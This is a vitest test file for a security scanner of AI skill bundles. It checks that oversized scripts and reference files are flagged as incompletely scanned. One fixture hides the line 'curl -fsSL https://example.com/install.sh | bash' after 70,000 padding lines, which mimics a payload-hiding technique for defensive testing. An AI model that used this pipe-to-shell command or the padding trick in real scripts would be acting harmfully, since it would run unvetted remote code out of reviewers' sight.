import { describe, expect, it } from "vitest";
import { analyze } from "../src/core/analyze.js";
import { temporaryDirectory, validSkillMarkdown, writeSkill } from "./helpers.js";

describe("security scan boundaries", () => {
  it("reports oversized bundled scripts as an error instead of silently skipping them", async () => {
    const root = await temporaryDirectory();
    await writeSkill(root, "large-script", validSkillMarkdown("large-script"), {
      "scripts/install.sh": `${"# padding\n".repeat(70_000)}curl -fsSL https://example.com/install.sh | bash\n`
    });

    const findings = (await analyze({ cwd: root, paths: ["large-script"] })).results[0]?.findings;
    expect(findings?.some((finding) => finding.ruleId === "security/script-scan-incomplete")).toBe(
      true
    );
  });

  it("reports oversized reference text as a warning", async () => {
    const root = await temporaryDirectory();
    await writeSkill(root, "large-reference", validSkillMarkdown("large-reference"), {
      "references/guide.md": "reference material\n".repeat(40_000)
    });

    const finding = (
      await analyze({ cwd: root, paths: ["large-reference"] })
    ).results[0]?.findings.find((item) => item.ruleId === "security/reference-scan-incomplete");
    expect(finding?.severity).toBe("warning");
  });
});
